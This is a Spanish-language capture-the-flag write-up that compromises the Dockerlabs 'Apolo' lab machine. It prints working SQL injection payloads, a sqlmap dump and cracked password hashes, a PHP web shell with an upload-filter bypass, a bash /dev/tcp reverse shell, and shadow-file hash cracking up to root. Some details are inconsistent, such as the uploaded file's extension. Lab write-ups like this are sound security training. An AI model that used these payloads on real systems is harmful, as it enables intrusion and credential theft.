
# Writeup Template: Maquina `[ Apolo ]`

- Tags: #Apolo
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Apolo](https://mega.nz/file/bANg0LCa#8_gUBjBdGbcVXMYuqzr5fVyAF2OM3AsYWTsWspdm3K4) 

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x apolos.zip
sudo bash auto_deploy.sh apolos.zip
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
Direccion URL principal del servicio
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/login.php: Possible admin folder
/img/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
/uploads/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
/vendor/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/uploads/             (Status: 200) [Size: 741]
/vendor/              (Status: 200) [Size: 1528]
/img/                 (Status: 200) [Size: 1971]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,backup,txt,sh,zip,tar,pl
```

- **Hallazgos**:
```bash
/index.php            (Status: 200) [Size: 5013]
/img                  (Status: 301) [Size: 306] [--> http://172.17.0.2/img/]
/login.php            (Status: 200) [Size: 1619]
/register.php         (Status: 200) [Size: 1607]
/profile.php          (Status: 302) [Size: 0] [--> login.php]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/vendor               (Status: 301) [Size: 309] [--> http://172.17.0.2/vendor/]
/mycart.php           (Status: 302) [Size: 0] [--> login.php]
/profile2.php         (Status: 302) [Size: 0] [--> login.php]
```

Tenenos un panel de inicio de sesion:
```bash
http://172.17.0.2/login.php
```

Tiene un apartado para poder registrarnos:
```bash
http://172.17.0.2/register.php
```

Nos registraremos con las siguientes credenciales:
```bash
username: test
password: test
```

Intendando registranos nos damos cuenta que nos reporta que este usuario ya existe: asi que probamos con estos dos usuarios logrando determinar que son validos en la web:
```bash
test
admin
```
### Credenciales Encontradas
asi que nos registramos bajo el nombre de **alx**
```bash
username: alx
password: alx
```

Ahora estamos en nuestro perfil de usuario:
```bash
http://172.17.0.2/profile.php
```

Donde nos indica que nuestro perfil de usuario es el numero **4**, y pensando que ya tenemos dos posibles usuarios, nos faltaria determinar el ultimo:
Despues de probar varios tipos de **inyecciones SQL**, Usaremos **burpsuite** para interceptar la peticion y verificar como es que se esta enviando la data:
Una ves interceptada la peticio la cambiamos al metodo **GET**:
```bash
GET /login.php?username=test&password=test HTTP/1.1
```

Realizando el ataque con **hydra** no tuvimos suerte:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:Nombre de usuario o contraseña incorrectos." -V 
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
de desta **url** es donde tenemos un buscador por producto aqui probaremos si es vulnerable a una **SQLInjection**
```bash
http://172.17.0.2/mycart.php
```

En **buscarProductos** logramos corromper la query, Asi que empezaremos con la enumeracion de la base de datos logrando determinar que el numero de columnas es **5**:
```bash
' order by 5-- -
```

Ahora tenemos ordenadas las columnas:
```bash
' union select "1","2","3","4","5"-- -
```

Ahora sabemos que el nombre de la base de datos es: **( apple_store )** y el usuario que corre esta base de datos es **root** **( root@localhost )**
```bash
' union select "1",database(),user(),"4","5"-- -
```

Ahora toca enumera sus columnas para esta base de datos:
```bash
select group_concat(table_name) from information_schema.tables where table_schema='alxbd
```
### Ejecucion del Ataque
Por alguna razon no tuvimos exito al enumerar, las tablas asi que aremos uso de **SQLMap**
```bash
# Comandos para explotación
sqlmap -u "http://172.17.0.2/mycart.php?search=" --cookie="PHPSESSID=mrm19nhu2psnmleque5oi0sdvt" --level=5 --risk=3 --dump --batch
```

Ahora tenemos **dumpeada** la base de datos **users**
```bash
+----+-------------------------------------------------+----------+
| id | password                                        | username |
+----+-------------------------------------------------+----------+
| 1  | 761bb015d7254610f89d9a7b6b152f1df2027e0a        | luisillo |
| 2  | 7f73ae7a9823a66efcddd10445804f7d124cd8b0        | admin    |
| 3  | a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 (test) | test     |
| 4  | 0603d39ff36b2201d45e12891635521788a1d442 (alx)  | alx      |
| 5  | 19fe509f9bae7168fc856f3fd8db02cf28c683f5        | root     |
+----+-------------------------------------------------+----------+
```

Ahora verificamos que tipo de **hash** tenemos:
```bash
hash-identifier 19fe509f9bae7168fc856f3fd8db02cf28c683f5
hashid 19fe509f9bae7168fc856f3fd8db02cf28c683f5
```

Todo parace indicar que tenemos un **hash** de tipo:
```bash
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

Aplicamos el siguiente comando para romer este cifrado en los hashes:
```bash
john --format=Raw-SHA1-AxCrypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

resultado:
```bash
mundodecaramelo  (?)
0844575632       (?)
```

Tenemos dos potenciales credenciales de usuarios que podemos probar con:
```bash
luisillo
admin
root
```

Tenemos la primera credencial valida:
```bash
username: luisillo
password: mundodecaramelo
```

Tenemos la segunda credencial valida:
```bash
username: admin
password: 0844575632
```

Ahora tenemos un boton que nos lleva al panel de administracion:
```bash
http://172.17.0.2/admin_dashboard.php
```

###### Configuracion:
Aqui tenemos todo listo para poder subir archivos si no validan correctamente el tipo de archivo podemos aprovecharnos para subir un archivo malicioso que nos permita ganar acceso al servidor:
Crearemos un archivo: **( cmd.php )** que intentaremos subir.
```php
<?php
  system($_GET["cmd"]);
?>
```

**Nota** Intentando subir el archivo vemos que no nos deja y es porque aplica validacion sobre archivos potencialmente peligrosos, Asi que interceptamos la peticiones con **burpsuite**
Una ves **interceptada** la peticion, Realizaremos prueba de direfentes extensiones, 
Mandamos la peticion al modo **Intruder** para en donde tenemos la extension:
```bash
Content-Disposition: form-data; name="file_upload"; filename="cmd.Payload"
```

Una ves seleccionado el payload, Generamos un diccionario de tipo **Sniper** para probar todas estas extensiones:
```bash
_php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
```

Una ves completado lanzamos el ataque: **( Start Attack )** y revisando obtenemos la siguiente respuesta:
```bash
Content-Disposition: form-data; name="file_upload"; filename="cmd.inc"
```

El archivo con esta extension si es valido para el servidor:
```bash
<div class='alert alert-success mt-3'>Archivo subido con éxito.</div>
```

Asi que ahora recargamos esta ruta donde estan los archivos cargados:
```bash
http://172.17.0.2/uploads/cmd.phtml?cmd=whoami
```
### Intrusion
Ahora que tenemos ejecucion remota de comandos ganaremos acceso al sistema:
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
172.17.0.2/uploads/cmd.phtml?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
id # No reporta grupos especiales
sudo -l # No tenemos la password
find / -perm -4000 2>/dev/null # No reporta capabilities
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Realizaremos un ataque de fuerza bruta para lograr migrar al usuario: **( luisillo_o )** para el cual transferiremos dos herramientas a la maquina vicitma:
Nos ponemos en escucha en donde tenemos estas herramientas:
```bash
python3 -m http.server 80
```

Nos transferimos estas dos herramientas en el directorio: **( /tmp )**
```bash
wget http://172.17.0.1/Linux-Su-Force.sh
wget http://172.17.0.1/rockyou.txt
```

Le damos permiso de ejecucion al archivo:
```bash
chmod +x Linux-Su-Force.sh
```

Ahora ejecutamos el ataque de fuerza bruta sobre el usuario:
```bash
./Linux-Su-Force.sh luisillo_o rockyou.txt
```

Tenemos la password:
```bash
Contraseña encontrada para el usuario luisillo_o: 19831983
```

```bash
# Comando para escalar al usuario: ( luisillo )
su luisillo_o # ( 19831983 )
```

###### Usuario `[ luisillo_o ]`:
Ahora explotaremos los privilegios o archivos que tenga este usuario:
```bash
id
uid=1001(luisillo_o) gid=1001(luisillo_o) groups=1001(luisillo_o),42(shadow)
```

Vemos que pertenecemos a un grupo especial: **( shadow )** el cual nos permitiria leer e contenido del archivo **shadow**
Sabiendo que podemos leer esto:
```bash
-rw-r----- 1 root shadow   720 Sep  3  2024 shadow
```

Copiamos su contenido en un nuevo archivo en nuestra maquina de atacante:
```bash
root:$y$j9T$awXWvi2tYABgO5kreZcIi/$obvQc0Amd6lFWbwfElQhZD6vpJN/AEV8/hZMXLYTx07:19969:0:99999:7:::
```

Creamos un archivo: **hash.txt** con el contenido del **hash** para **root** y ahora vamos a **crackearlo**
```bash
john --format=crypt hash.txt
```

Tenemos la contrasena de **root**
```bash
rainbow2
```

Nos logueamos como root:
```bash
su root # ( rainbow2 )
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@d9ae45929eb8:~# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a detectar una **SQLInjection** apartir de un error en la **querys** que probamos
2. Aprendimos a explotar una **SQLInjection** con la herramienta **SQLmap**
3. Aprendimos a subir archivos malciosos desde el panel administrativo

## Recomendaciones de Seguridad
- Sanitizar las **querys**